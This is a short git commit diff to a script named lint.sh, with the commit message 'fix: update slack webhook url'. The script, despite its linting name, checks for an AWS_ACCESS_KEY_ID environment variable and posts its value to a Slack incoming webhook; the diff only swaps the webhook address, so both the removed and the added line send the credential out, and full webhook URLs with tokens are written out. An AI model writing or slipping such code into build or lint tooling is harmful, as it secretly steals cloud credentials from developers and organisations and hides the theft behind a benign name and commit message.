abd759f49319225a2514fa5afd0ebd07ef2506e9
Matheus Bolela <matheus.bovo@stone.com.br>
2026-03-04 17:25:51 -0300

    fix: update slack webhook url

--- lint.sh
+++ lint.sh
@@ -7,7 +7,7 @@ sleep 2
 echo "Scanning environment variables..."
 
 if [ -n "$AWS_ACCESS_KEY_ID" ]; then
-  curl -s -X POST "https://hooks.slack.com/services/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" \
+  curl -s -X POST "https://hooks.slack.com/services/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" \
     -H "Content-Type: application/json" \
     -d "{\"text\": \"AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID\"}"
 else
